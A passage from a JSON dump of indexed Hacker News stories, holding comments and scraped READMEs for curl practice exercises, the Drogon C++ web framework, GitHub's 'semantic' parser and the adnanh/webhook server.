(www.google.com/robots.txt) Make a GET request to https://httpbin.org/anything and set the header User-Agent: elephant. Make a DELETE request to https://httpbin.org/anything Request https://httpbin.org/anything and also get the response headers Make a POST request to https://httpbin.org/anything with the JSON body {\"value\": \"panda\"} Make the same POST request as the previous exercise, but set the Content-Type header to application/json (because POST requests need to have a content type that matches their body). Look at the json field in the response to see the difference from the previous one. Make a GET request to https://httpbin.org/anything and set the header Accept-Encoding: gzip (what happens? why?) Put a bunch of a JSON in a file and then make a POST request to https://httpbin.org/anything with the JSON in that file as the body Make a request to https://httpbin.org/image and set the header Accept: image/png. Save the output to a PNG file and open the file in an image viewer. Try the same thing with different Accept: headers. Make a PUT request to https://httpbin.org/anything Request https://httpbin.org/image/jpeg, save it to a file, and open that file in your image editor. Request https://www.twitter.com. Youll get an empty response. Get curl to show you the response headers too, and try to figure out why the response was empty. Make any request to https://httpbin.org/anything and just set some nonsense headers (like panda: elephant) Request https://httpbin.org/status/404 and https://httpbin.org/status/200. Request them again and get curl to show the response headers. Request https://httpbin.org/anything and set a username and password (with -u username:password) Download the Twitter homepage (https://twitter.com) in Spanish by setting the Accept-Language: es-ES header. Make a request to the Stripe API with curl. (see https://stripe.com/docs/development for how, they give you a test API key). Try making exactly the same request to https://httpbin.org/anything. ",
        "comments.comment_id": [20813303, 20813591],
        "comments.comment_author": ["AndrejKolar", "UI_at_80x24"],
        "comments.comment_descendants": [1, 2],
        "comments.comment_time": [
          "2019-08-27T19:03:29Z",
          "2019-08-27T19:33:10Z"
        ],
        "comments.comment_text": [
          "I really like using HTTPie (<a href=\"https://httpie.org\" rel=\"nofollow\">https://httpie.org</a>). Much friendlier syntax then curl, formats the output...<p>Also works great with fx (<a href=\"https://github.com/antonmedv/fx\" rel=\"nofollow\">https://github.com/antonmedv/fx</a>). Just pipe the output from HTTPie and you get easy json processing.",
          "This is more SysAdmin related, but one power-curl function I use atleast 30 times a day is this alias I have in my .bash_aliases<p>This will output the HTTP status code for a given URL.<p><pre><code>     alias hstat=\"curl -o /dev/null --silent --head --write-out '%{http_code}\\n'\" $1  \n</code></pre>\nExample:<p><pre><code>  $ hstat google.com\n  301\n</code></pre>\nI also use curl as an 'uptime monitor' by adding onto that code section.  (a file with a list of URLs, and \"if http status code !=200\" then email me.)<p>There are variations on this all over the place but I really depend on it and I like it."
        ],
        "id": "2c95423f-5538-4ed0-bfb2-a73fa4c80b84",
        "_version_": 1718527421866573824
      },
      {
        "story_id": [19427332],
        "story_author": ["an-tao"],
        "story_descendants": [105],
        "story_score": [189],
        "story_time": ["2019-03-19T01:47:40Z"],
        "story_title": "Show HN: Drogon – A C++14/17 based high performance HTTP application framework",
        "search": [
          "Show HN: Drogon – A C++14/17 based high performance HTTP application framework",
          "https://github.com/an-tao/drogon",
          "English | | Overview Drogon is a C++14/17-based HTTP application framework. Drogon can be used to easily build various types of web application server programs using C++. Drogon is the name of a dragon in the American TV series \"Game of Thrones\" that I really like. Drogon is a cross-platform framework, It supports Linux, macOS, FreeBSD, OpenBSD, HaikuOS, and Windows. Its main features are as follows: Use a non-blocking I/O network lib based on epoll (kqueue under macOS/FreeBSD) to provide high-concurrency, high-performance network IO, please visit the TFB Tests Results for more details; Provide a completely asynchronous programming mode; Support Http1.0/1.1 (server side and client side); Based on template, a simple reflection mechanism is implemented to completely decouple the main program framework, controllers and views. Support cookies and built-in sessions; Support back-end rendering, the controller generates the data to the view to generate the Html page. Views are described by CSP template files, C++ codes are embedded into Html pages through CSP tags. And the drogon command-line tool automatically generates the C++ code files for compilation; Support view page dynamic loading (dynamic compilation and loading at runtime); Provide a convenient and flexible routing solution from the path to the controller handler; Support filter chains to facilitate the execution of unified logic (such as login verification, Http Method constraint verification, etc.) before handling HTTP requests; Support https (based on OpenSSL); Support WebSocket (server side and client side); Support JSON format request and response, very friendly to the Restful API application development; Support file download and upload; Support gzip, brotli compression transmission; Support pipelining; Provide a lightweight command line tool, drogon_ctl, to simplify the creation of various classes in Drogon and the generation of view code; Support non-blocking I/O based asynchronously reading and writing database (PostgreSQL and MySQL(MariaDB) database); Support asynchronously reading and writing sqlite3 database based on thread pool; Support Redis with asynchronous reading and writing; Support ARM Architecture; Provide a convenient lightweight ORM implementation that supports for regular object-to-database bidirectional mapping; Support plugins which can be installed by the configuration file at load time; Support AOP with build-in joinpoints. Support C++ coroutines A very simple example Unlike most C++ frameworks, the main program of the drogon application can be kept clean and simple. Drogon uses a few tricks to decouple controllers from the main program. The routing settings of controllers can be done through macros or configuration file. Below is the main program of a typical drogon application: #include <drogon/drogon.h> using namespace drogon; int main() { app().setLogPath(\"./\") .setLogLevel(trantor::Logger::kWarn) .addListener(\"0.0.0.0\", 80) .setThreadNum(16) .enableRunAsDaemon() .run(); } It can be further simplified by using configuration file as follows: #include <drogon/drogon.h> using namespace drogon; int main() { app().loadConfigFile(\"./config.json\").run(); } Drogon provides some interfaces for adding controller logic directly in the main() function, for example, user can register a handler like this in Drogon: app().registerHandler(\"/test?username={name}\", [](const HttpRequestPtr& req, std::function<void (const HttpResponsePtr &)> &&callback, const std::string &name) { Json::Value json; json[\"result\"]=\"ok\"; json[\"message\"]=std::string(\"hello,\")+name; auto resp=HttpResponse::newHttpJsonResponse(json); callback(resp); }, {Get,\"LoginFilter\"}); While such interfaces look intuitive, they are not suitable for complex business logic scenarios. Assuming there are tens or even hundreds of handlers that need to be registered in the framework, isn't it a better practice to implement them separately in their respective classes? So unless your logic is very simple, we don't recommend using above interfaces. Instead, we can create an HttpSimpleController as follows: /// The TestCtrl.h file #pragma once #include <drogon/HttpSimpleController.h> using namespace drogon; class TestCtrl:public drogon::HttpSimpleController<TestCtrl> { public: virtual void asyncHandleHttpRequest(const HttpRequestPtr& req, std::function<void (const HttpResponsePtr &)> &&callback) override; PATH_LIST_BEGIN PATH_ADD(\"/test\",Get); PATH_LIST_END }; /// The TestCtrl.cc file #include \"TestCtrl.h\" void TestCtrl::asyncHandleHttpRequest(const HttpRequestPtr& req, std::function<void (const HttpResponsePtr &)> &&callback) { //write your application logic here auto resp = HttpResponse::newHttpResponse(); resp->setBody(\"<p>Hello, world!</p>\"); resp->setExpiredTime(0); callback(resp); } Most of the above programs can be automatically generated by the command line tool drogon_ctl provided by drogon (The command is drogon_ctl create controller TestCtrl). All the user needs to do is add their own business logic. In the example, the controller returns a Hello, world! string when the client accesses the http://ip/test URL. For JSON format response, we create the controller as follows: /// The header file #pragma once #include <drogon/HttpSimpleController.h> using namespace drogon; class JsonCtrl : public drogon::HttpSimpleController<JsonCtrl> { public: virtual void asyncHandleHttpRequest(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback) override; PATH_LIST_BEGIN //list path definitions here; PATH_ADD(\"/json\", Get); PATH_LIST_END }; /// The source file #include \"JsonCtrl.h\" void JsonCtrl::asyncHandleHttpRequest(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback) { Json::Value ret; ret[\"message\"] = \"Hello, World!\"; auto resp = HttpResponse::newHttpJsonResponse(ret); callback(resp); } Let's go a step further and create a demo RESTful API with the HttpController class, as shown below (Omit the source file): /// The header file #pragma once #include <drogon/HttpController.h> using namespace drogon; namespace api { namespace v1 { class User : public drogon::HttpController<User> { public: METHOD_LIST_BEGIN //use METHOD_ADD to add your custom processing function here; METHOD_ADD(User::getInfo, \"/{id}\", Get); //path is /api/v1/User/{arg1} METHOD_ADD(User::getDetailInfo, \"/{id}/detailinfo\", Get); //path is /api/v1/User/{arg1}/detailinfo METHOD_ADD(User::newUser, \"/{name}\", Post); //path is /api/v1/User/{arg1} METHOD_LIST_END //your declaration of processing function maybe like this: void getInfo(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback, int userId) const; void getDetailInfo(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback, int userId) const; void newUser(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback, std::string &&userName); public: User() { LOG_DEBUG << \"User constructor!\"; } }; } // namespace v1 } // namespace api As you can see, users can use the HttpController to map paths and parameters at the same time. This is a very convenient way to create a RESTful API application. In addition, you can also find that all handler interfaces are in asynchronous mode, where the response is returned by a callback object. This design is for performance reasons because in asynchronous mode the drogon application can handle a large number of concurrent requests with a small number of threads. After compiling all of the above source files, we get a very simple web application. This is a good start. For more information, please visit the wiki or DocsForge Contributions Every contribution is welcome. Please refer to the contribution guidelines for more information. ",
          "2 small things.<p>a) Show me the code to start with, don't send me digging for it. A SimpleController example as the very first thing would help give a feel for the project, and makes me more likely to consider the project.<p>b) If there's an easier way (like the drogon_ctl utility at the start of Quickstart [0]), show that first, and the more detailed way second.<p>Other than that, it looks great. I've used libmicrohttpd a few times, so a bit less of an overhead always looks great.<p>[0] <a href=\"https://github.com/an-tao/drogon/wiki/quick-start\" rel=\"nofollow\">https://github.com/an-tao/drogon/wiki/quick-start</a>",
          "This is cool, and I like it. Very Haskell like, which is a compliment in my book.<p>But one thing that surprises me is that folks are essentially sleeping on HTTP/2. HTTP/2 is just a hell of a lot better in most every dimension. It's better for handshake latency, it's better for bandwidth in most cases, it's better for eliminating excess SSL overhead and also, it's kinda easier to write client libraries for, because it's so much simpler (although the parallel and concurrent nature of connections will challenge a lot of programmers).<p>It's not bad to see a new contender in this space, but it's surprising that it isn't http/2 first. Is there a good reason for this? It's busted through 90% support on caniuse, so it's hard to make an argument that adoption holds it back."
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/an-tao/drogon",
        "comments.comment_id": [19427737, 19427925],
        "comments.comment_author": ["shakna", "KirinDave"],
        "comments.comment_descendants": [1, 8],
        "comments.comment_time": [
          "2019-03-19T03:06:56Z",
          "2019-03-19T03:45:52Z"
        ],
        "comments.comment_text": [
          "2 small things.<p>a) Show me the code to start with, don't send me digging for it. A SimpleController example as the very first thing would help give a feel for the project, and makes me more likely to consider the project.<p>b) If there's an easier way (like the drogon_ctl utility at the start of Quickstart [0]), show that first, and the more detailed way second.<p>Other than that, it looks great. I've used libmicrohttpd a few times, so a bit less of an overhead always looks great.<p>[0] <a href=\"https://github.com/an-tao/drogon/wiki/quick-start\" rel=\"nofollow\">https://github.com/an-tao/drogon/wiki/quick-start</a>",
          "This is cool, and I like it. Very Haskell like, which is a compliment in my book.<p>But one thing that surprises me is that folks are essentially sleeping on HTTP/2. HTTP/2 is just a hell of a lot better in most every dimension. It's better for handshake latency, it's better for bandwidth in most cases, it's better for eliminating excess SSL overhead and also, it's kinda easier to write client libraries for, because it's so much simpler (although the parallel and concurrent nature of connections will challenge a lot of programmers).<p>It's not bad to see a new contender in this space, but it's surprising that it isn't http/2 first. Is there a good reason for this? It's busted through 90% support on caniuse, so it's hard to make an argument that adoption holds it back."
        ],
        "id": "21acaf67-e120-408b-a8e5-5581bd529dcd",
        "url_text": "English | | Overview Drogon is a C++14/17-based HTTP application framework. Drogon can be used to easily build various types of web application server programs using C++. Drogon is the name of a dragon in the American TV series \"Game of Thrones\" that I really like. Drogon is a cross-platform framework, It supports Linux, macOS, FreeBSD, OpenBSD, HaikuOS, and Windows. Its main features are as follows: Use a non-blocking I/O network lib based on epoll (kqueue under macOS/FreeBSD) to provide high-concurrency, high-performance network IO, please visit the TFB Tests Results for more details; Provide a completely asynchronous programming mode; Support Http1.0/1.1 (server side and client side); Based on template, a simple reflection mechanism is implemented to completely decouple the main program framework, controllers and views. Support cookies and built-in sessions; Support back-end rendering, the controller generates the data to the view to generate the Html page. Views are described by CSP template files, C++ codes are embedded into Html pages through CSP tags. And the drogon command-line tool automatically generates the C++ code files for compilation; Support view page dynamic loading (dynamic compilation and loading at runtime); Provide a convenient and flexible routing solution from the path to the controller handler; Support filter chains to facilitate the execution of unified logic (such as login verification, Http Method constraint verification, etc.) before handling HTTP requests; Support https (based on OpenSSL); Support WebSocket (server side and client side); Support JSON format request and response, very friendly to the Restful API application development; Support file download and upload; Support gzip, brotli compression transmission; Support pipelining; Provide a lightweight command line tool, drogon_ctl, to simplify the creation of various classes in Drogon and the generation of view code; Support non-blocking I/O based asynchronously reading and writing database (PostgreSQL and MySQL(MariaDB) database); Support asynchronously reading and writing sqlite3 database based on thread pool; Support Redis with asynchronous reading and writing; Support ARM Architecture; Provide a convenient lightweight ORM implementation that supports for regular object-to-database bidirectional mapping; Support plugins which can be installed by the configuration file at load time; Support AOP with build-in joinpoints. Support C++ coroutines A very simple example Unlike most C++ frameworks, the main program of the drogon application can be kept clean and simple. Drogon uses a few tricks to decouple controllers from the main program. The routing settings of controllers can be done through macros or configuration file. Below is the main program of a typical drogon application: #include <drogon/drogon.h> using namespace drogon; int main() { app().setLogPath(\"./\") .setLogLevel(trantor::Logger::kWarn) .addListener(\"0.0.0.0\", 80) .setThreadNum(16) .enableRunAsDaemon() .run(); } It can be further simplified by using configuration file as follows: #include <drogon/drogon.h> using namespace drogon; int main() { app().loadConfigFile(\"./config.json\").run(); } Drogon provides some interfaces for adding controller logic directly in the main() function, for example, user can register a handler like this in Drogon: app().registerHandler(\"/test?username={name}\", [](const HttpRequestPtr& req, std::function<void (const HttpResponsePtr &)> &&callback, const std::string &name) { Json::Value json; json[\"result\"]=\"ok\"; json[\"message\"]=std::string(\"hello,\")+name; auto resp=HttpResponse::newHttpJsonResponse(json); callback(resp); }, {Get,\"LoginFilter\"}); While such interfaces look intuitive, they are not suitable for complex business logic scenarios. Assuming there are tens or even hundreds of handlers that need to be registered in the framework, isn't it a better practice to implement them separately in their respective classes? So unless your logic is very simple, we don't recommend using above interfaces. Instead, we can create an HttpSimpleController as follows: /// The TestCtrl.h file #pragma once #include <drogon/HttpSimpleController.h> using namespace drogon; class TestCtrl:public drogon::HttpSimpleController<TestCtrl> { public: virtual void asyncHandleHttpRequest(const HttpRequestPtr& req, std::function<void (const HttpResponsePtr &)> &&callback) override; PATH_LIST_BEGIN PATH_ADD(\"/test\",Get); PATH_LIST_END }; /// The TestCtrl.cc file #include \"TestCtrl.h\" void TestCtrl::asyncHandleHttpRequest(const HttpRequestPtr& req, std::function<void (const HttpResponsePtr &)> &&callback) { //write your application logic here auto resp = HttpResponse::newHttpResponse(); resp->setBody(\"<p>Hello, world!</p>\"); resp->setExpiredTime(0); callback(resp); } Most of the above programs can be automatically generated by the command line tool drogon_ctl provided by drogon (The command is drogon_ctl create controller TestCtrl). All the user needs to do is add their own business logic. In the example, the controller returns a Hello, world! string when the client accesses the http://ip/test URL. For JSON format response, we create the controller as follows: /// The header file #pragma once #include <drogon/HttpSimpleController.h> using namespace drogon; class JsonCtrl : public drogon::HttpSimpleController<JsonCtrl> { public: virtual void asyncHandleHttpRequest(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback) override; PATH_LIST_BEGIN //list path definitions here; PATH_ADD(\"/json\", Get); PATH_LIST_END }; /// The source file #include \"JsonCtrl.h\" void JsonCtrl::asyncHandleHttpRequest(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback) { Json::Value ret; ret[\"message\"] = \"Hello, World!\"; auto resp = HttpResponse::newHttpJsonResponse(ret); callback(resp); } Let's go a step further and create a demo RESTful API with the HttpController class, as shown below (Omit the source file): /// The header file #pragma once #include <drogon/HttpController.h> using namespace drogon; namespace api { namespace v1 { class User : public drogon::HttpController<User> { public: METHOD_LIST_BEGIN //use METHOD_ADD to add your custom processing function here; METHOD_ADD(User::getInfo, \"/{id}\", Get); //path is /api/v1/User/{arg1} METHOD_ADD(User::getDetailInfo, \"/{id}/detailinfo\", Get); //path is /api/v1/User/{arg1}/detailinfo METHOD_ADD(User::newUser, \"/{name}\", Post); //path is /api/v1/User/{arg1} METHOD_LIST_END //your declaration of processing function maybe like this: void getInfo(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback, int userId) const; void getDetailInfo(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback, int userId) const; void newUser(const HttpRequestPtr &req, std::function<void(const HttpResponsePtr &)> &&callback, std::string &&userName); public: User() { LOG_DEBUG << \"User constructor!\"; } }; } // namespace v1 } // namespace api As you can see, users can use the HttpController to map paths and parameters at the same time. This is a very convenient way to create a RESTful API application. In addition, you can also find that all handler interfaces are in asynchronous mode, where the response is returned by a callback object. This design is for performance reasons because in asynchronous mode the drogon application can handle a large number of concurrent requests with a small number of threads. After compiling all of the above source files, we get a very simple web application. This is a good start. For more information, please visit the wiki or DocsForge Contributions Every contribution is welcome. Please refer to the contribution guidelines for more information. ",
        "_version_": 1718527394761932800
      },
      {
        "story_id": [20062064],
        "story_author": ["lelf"],
        "story_descendants": [25],
        "story_score": [193],
        "story_time": ["2019-05-31T15:57:18Z"],
        "story_title": "Semantic: Parsing, analyzing, and comparing source code across many languages",
        "search": [
          "Semantic: Parsing, analyzing, and comparing source code across many languages",
          "https://github.com/github/semantic",
          "semantic is a Haskell library and command line tool for parsing, analyzing, and comparing source code. In a hurry? Check out our documentation of example uses for the semantic command line tool. Table of Contents Usage Language support Development Technology and architecture Licensing Usage Run semantic --help for complete list of up-to-date options. Parse Usage: semantic parse [--sexpression | (--json-symbols|--symbols) | --proto-symbols | --show | --quiet] [FILES...] Generate parse trees for path(s) Available options: --sexpression Output s-expression parse trees (default) --json-symbols,--symbols Output JSON symbol list --proto-symbols Output protobufs symbol list --show Output using the Show instance (debug only, format subject to change without notice) --quiet Don't produce output, but show timing stats -h,--help Show this help text Language support Language Parse AST Symbols Stack graphs Ruby JavaScript TypeScript Python Go PHP Java JSON JSX TSX CodeQL Haskell Used for code navigation on github.com. Supported Partial support Under development - N/A Development semantic requires at least GHC 8.10.1 and Cabal 3.0. We strongly recommend using ghcup to sandbox GHC versions, as GHC packages installed through your OS's package manager may not install statically-linked versions of the GHC boot libraries. semantic currently builds only on Unix systems; users of other operating systems may wish to use the Docker images. We use cabal's Nix-style local builds for development. To get started quickly: git clone git@github.com:github/semantic.git cd semantic script/bootstrap cabal v2-build all cabal v2-run semantic:test cabal v2-run semantic:semantic -- --help You can also use the Bazel build system for development. To learn more about Bazel and why it might give you a better development experience, check the build documentation. git clone git@github.com:github/semantic.git cd semantic script/bootstrap-bazel bazel build //... stack as a build tool is not officially supported; there is unofficial stack.yaml support available, though we cannot make guarantees as to its stability. Technology and architecture Architecturally, semantic: Generates per-language Haskell syntax types based on tree-sitter grammar definitions. Reads blobs from a filesystem or provided via a protocol buffer request. Returns blobs or performs analysis. Renders output in one of many supported formats. Throughout its lifestyle, semantic has leveraged a number of interesting algorithms and techniques, including: Myers' algorithm (SES) as described in the paper An O(ND) Difference Algorithm and Its Variations RWS as described in the paper RWS-Diff: Flexible and Efficient Change Detection in Hierarchical Data. Open unions and data types la carte. An implementation of Abstracting Definitional Interpreters extended to work with an la carte representation of syntax terms. Contributions Contributions are welcome! Please see our contribution guidelines and our code of conduct for details on how to participate in our community. Licensing Semantic is licensed under the MIT license. ",
          "Looks very interesting - would benefit from showing some examples and/or use cases",
          "The late 20th century, early 00's version:<p><a href=\"http://www.program-transformation.org/Transform/CodeCrawler\" rel=\"nofollow\">http://www.program-transformation.org/Transform/CodeCrawler</a><p>(And MOOSE)"
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/github/semantic",
        "url_text": "semantic is a Haskell library and command line tool for parsing, analyzing, and comparing source code. In a hurry? Check out our documentation of example uses for the semantic command line tool. Table of Contents Usage Language support Development Technology and architecture Licensing Usage Run semantic --help for complete list of up-to-date options. Parse Usage: semantic parse [--sexpression | (--json-symbols|--symbols) | --proto-symbols | --show | --quiet] [FILES...] Generate parse trees for path(s) Available options: --sexpression Output s-expression parse trees (default) --json-symbols,--symbols Output JSON symbol list --proto-symbols Output protobufs symbol list --show Output using the Show instance (debug only, format subject to change without notice) --quiet Don't produce output, but show timing stats -h,--help Show this help text Language support Language Parse AST Symbols Stack graphs Ruby JavaScript TypeScript Python Go PHP Java JSON JSX TSX CodeQL Haskell Used for code navigation on github.com. Supported Partial support Under development - N/A Development semantic requires at least GHC 8.10.1 and Cabal 3.0. We strongly recommend using ghcup to sandbox GHC versions, as GHC packages installed through your OS's package manager may not install statically-linked versions of the GHC boot libraries. semantic currently builds only on Unix systems; users of other operating systems may wish to use the Docker images. We use cabal's Nix-style local builds for development. To get started quickly: git clone git@github.com:github/semantic.git cd semantic script/bootstrap cabal v2-build all cabal v2-run semantic:test cabal v2-run semantic:semantic -- --help You can also use the Bazel build system for development. To learn more about Bazel and why it might give you a better development experience, check the build documentation. git clone git@github.com:github/semantic.git cd semantic script/bootstrap-bazel bazel build //... stack as a build tool is not officially supported; there is unofficial stack.yaml support available, though we cannot make guarantees as to its stability. Technology and architecture Architecturally, semantic: Generates per-language Haskell syntax types based on tree-sitter grammar definitions. Reads blobs from a filesystem or provided via a protocol buffer request. Returns blobs or performs analysis. Renders output in one of many supported formats. Throughout its lifestyle, semantic has leveraged a number of interesting algorithms and techniques, including: Myers' algorithm (SES) as described in the paper An O(ND) Difference Algorithm and Its Variations RWS as described in the paper RWS-Diff: Flexible and Efficient Change Detection in Hierarchical Data. Open unions and data types la carte. An implementation of Abstracting Definitional Interpreters extended to work with an la carte representation of syntax terms. Contributions Contributions are welcome! Please see our contribution guidelines and our code of conduct for details on how to participate in our community. Licensing Semantic is licensed under the MIT license. ",
        "comments.comment_id": [20062368, 20062741],
        "comments.comment_author": ["anentropic", "stcredzero"],
        "comments.comment_descendants": [1, 0],
        "comments.comment_time": [
          "2019-05-31T16:27:42Z",
          "2019-05-31T17:01:44Z"
        ],
        "comments.comment_text": [
          "Looks very interesting - would benefit from showing some examples and/or use cases",
          "The late 20th century, early 00's version:<p><a href=\"http://www.program-transformation.org/Transform/CodeCrawler\" rel=\"nofollow\">http://www.program-transformation.org/Transform/CodeCrawler</a><p>(And MOOSE)"
        ],
        "id": "c30093a4-0503-454c-9883-3203d0db109c",
        "_version_": 1718527406852014080
      },
      {
        "story_id": [21676256],
        "story_author": ["osprojects"],
        "story_descendants": [4],
        "story_score": [32],
        "story_time": ["2019-12-01T16:42:50Z"],
        "story_title": "Open Source Webhook Server",
        "search": [
          "Open Source Webhook Server",
          "https://github.com/adnanh/webhook",
          "What is webhook? webhook is a lightweight configurable tool written in Go, that allows you to easily create HTTP endpoints (hooks) on your server, which you can use to execute configured commands. You can also pass data from the HTTP request (such as headers, payload or query variables) to your commands. webhook also allows you to specify rules which have to be satisfied in order for the hook to be triggered. For example, if you're using Github or Bitbucket, you can use webhook to set up a hook that runs a redeploy script for your project on your staging server, whenever you push changes to the master branch of your project. If you use Mattermost or Slack, you can set up an \"Outgoing webhook integration\" or \"Slash command\" to run various commands on your server, which can then report back directly to you or your channels using the \"Incoming webhook integrations\", or the appropriate response body. webhook aims to do nothing more than it should do, and that is: receive the request, parse the headers, payload and query variables, check if the specified rules for the hook are satisfied, and finally, pass the specified arguments to the specified command via command line arguments or via environment variables. Everything else is the responsibility of the command's author. Hookdoo If you don't have time to waste configuring, hosting, debugging and maintaining your webhook instance, we offer a SaaS solution that has all of the capabilities webhook provides, plus a lot more, and all that packaged in a nice friendly web interface. If you are interested, find out more at hookdoo website. If you have any questions, you can contact us at info@hookdoo.com If you need a way of inspecting, monitoring and replaying webhooks without the back and forth troubleshooting, give Hookdeck a try! Getting started Installation Building from source To get started, first make sure you've properly set up your Go 1.14 or newer environment and then run $ go build github.com/adnanh/webhook to build the latest version of the webhook. Using package manager Snap store Ubuntu If you are using Ubuntu linux (17.04 or later), you can install webhook using sudo apt-get install webhook which will install community packaged version. Debian If you are using Debian linux (\"stretch\" or later), you can install webhook using sudo apt-get install webhook which will install community packaged version (thanks @freeekanayaka) from https://packages.debian.org/sid/webhook Download prebuilt binaries Prebuilt binaries for different architectures are available at GitHub Releases. Configuration Next step is to define some hooks you want webhook to serve. webhook supports JSON or YAML configuration files, but we'll focus primarily on JSON in the following example. Begin by creating an empty file named hooks.json. This file will contain an array of hooks the webhook will serve. Check Hook definition page to see the detailed description of what properties a hook can contain, and how to use them. Let's define a simple hook named redeploy-webhook that will run a redeploy script located in /var/scripts/redeploy.sh. Make sure that your bash script has #!/bin/sh shebang on top. Our hooks.json file will now look like this: [ { \"id\": \"redeploy-webhook\", \"execute-command\": \"/var/scripts/redeploy.sh\", \"command-working-directory\": \"/var/webhook\" } ] NOTE: If you prefer YAML, the equivalent hooks.yaml file would be: - id: redeploy-webhook execute-command: \"/var/scripts/redeploy.sh\" command-working-directory: \"/var/webhook\" You can now run webhook using $ /path/to/webhook -hooks hooks.json -verbose It will start up on default port 9000 and will provide you with one HTTP endpoint http://yourserver:9000/hooks/redeploy-webhook Check webhook parameters page to see how to override the ip, port and other settings such as hook hotreload, verbose output, etc, when starting the webhook. By performing a simple HTTP GET or POST request to that endpoint, your specified redeploy script would be executed. Neat! However, hook defined like that could pose a security threat to your system, because anyone who knows your endpoint, can send a request and execute your command. To prevent that, you can use the \"trigger-rule\" property for your hook, to specify the exact circumstances under which the hook would be triggered. For example, you can use them to add a secret that you must supply as a parameter in order to successfully trigger the hook. Please check out the Hook rules page for detailed list of available rules and their usage. Multipart Form Data webhook provides limited support the parsing of multipart form data. Multipart form data can contain two types of parts: values and files. All form values are automatically added to the payload scope. Use the parse-parameters-as-json settings to parse a given value as JSON. All files are ignored unless they match one of the following criteria: The Content-Type header is application/json. The part is named in the parse-parameters-as-json setting. In either case, the given file part will be parsed as JSON and added to the payload map. Templates webhook can parse the hooks configuration file as a Go template when given the -template CLI parameter. See the Templates page for more details on template usage. Using HTTPS webhook by default serves hooks using http. If you want webhook to serve secure content using https, you can use the -secure flag while starting webhook. Files containing a certificate and matching private key for the server must be provided using the -cert /path/to/cert.pem and -key /path/to/key.pem flags. If the certificate is signed by a certificate authority, the cert file should be the concatenation of the server's certificate followed by the CA's certificate. TLS version and cipher suite selection flags are available from the command line. To list available cipher suites, use the -list-cipher-suites flag. The -tls-min-version flag can be used with -list-cipher-suites. CORS Headers If you want to set CORS headers, you can use the -header name=value flag while starting webhook to set the appropriate CORS headers that will be returned with each response. Interested in running webhook inside of a Docker container? You can use one of the following Docker images, or create your own (please read this discussion): almir/webhook roxedus/webhook thecatlady/webhook Examples Check out Hook examples page for more complex examples of hooks. Guides featuring webhook Plex 2 Telegram by @psyhomb Webhook & JIRA by @perfecto25 Trigger Ansible AWX job runs on SCM (e.g. git) commit by @jpmens Deploy using GitHub webhooks by @awea Setting up Automatic Deployment and Builds Using Webhooks by Will Browning Auto deploy your Node.js app on push to GitHub in 3 simple steps by Karolis Rusenas Automate Static Site Deployments with Salt, Git, and Webhooks by Linode Using Prometheus to Automatically Scale WebLogic Clusters on Kubernetes by Marina Kogan Github Pages and Jekyll - A New Platform for LACNIC Labs by Carlos Martnez Cagnazzo How to Deploy React Apps Using Webhooks and Integrating Slack on Ubuntu by Arslan Ud Din Shafiq Private webhooks by Thomas Adventures in webhooks by Drake GitHub pro tips by Spencer Lyon XiaoMi Vacuum + Amazon Button = Dash Cleaning by c0mmensal Set up Automated Deployments From Github With Webhook by Maxim Orlov VIDEO: Gitlab CI/CD configuration using Docker and adnanh/webhook to deploy on VPS - Tutorial #1 by Yes! Let's Learn Software Engineering Integrate automatic deployment in 20 minutes using webhooks + Nginx setup by Anksus ... Want to add your own? Open an Issue or create a PR :-) Community Contributions See the webhook-contrib repository for a collections of tools and helpers related to webhook that have been contributed by the webhook community. Need help? Check out existing issues to see if someone else also had the same problem, or open a new one. Support active development Sponsors DigitalOcean is a simple and robust cloud computing platform, designed for developers. BrowserStack is a cloud-based cross-browser testing tool that enables developers to test their websites across various browsers on different operating systems and mobile devices, without requiring users to install virtual machines, devices or emulators. Support this project by becoming a sponsor. Your logo will show up here with a link to your website. By contributing This project exists thanks to all the people who contribute. Contribute!. By giving money OpenCollective Backer OpenCollective Sponsor PayPal Patreon Faircode Flattr Thank you to all our backers! License The MIT License (MIT) Copyright (c) 2015 Adnan Hajdarevic adnanh@gmail.com Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. ",
          "Interesting, could be useful to interface some of my stuff with IFTTT or Integromat.",
          "I have been using this webhook server in prod for a few years and its been easy to setup/maintain ... you just define  github.com repo to publish `git push` or whatever then this webhook server listens to every git push my team makes to launch a code recompile/redeploy ...  foolproof and solid ... I highly recommend"
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/adnanh/webhook",
        "comments.comment_id": [21679205, 21688092],
        "comments.comment_author": ["m-p-3", "AtomicOrbital"],
        "comments.comment_descendants": [1, 0],
        "comments.comment_time": [
          "2019-12-02T01:32:48Z",
          "2019-12-02T23:09:42Z"
        ],
        "comments.comment_text": [
          "Interesting, could be useful to interface some of my stuff with IFTTT or Integromat.",
          "I have been using this webhook server in prod for a few years and its been easy to setup/maintain ... you just define  github.com repo to publish `git push` or whatever then this webhook server listens to every git push my team makes to launch a code recompile/redeploy ...  foolproof and solid ... I highly recommend"
        ],
